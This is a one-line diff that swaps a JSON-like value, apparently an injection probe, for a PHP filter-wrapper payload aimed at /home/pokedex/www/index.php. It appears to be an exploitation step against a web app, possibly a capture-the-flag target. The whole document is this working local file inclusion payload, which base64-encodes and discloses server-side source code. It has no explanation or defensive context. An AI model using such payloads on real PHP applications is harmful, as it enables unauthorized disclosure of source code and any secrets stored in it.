@@ -1,1 +1,1 @@
-{"trainer": "'prout', 'win', 1"}
+php://filter/read=convert.base64-encode/resource=/home/pokedex/www/index.php
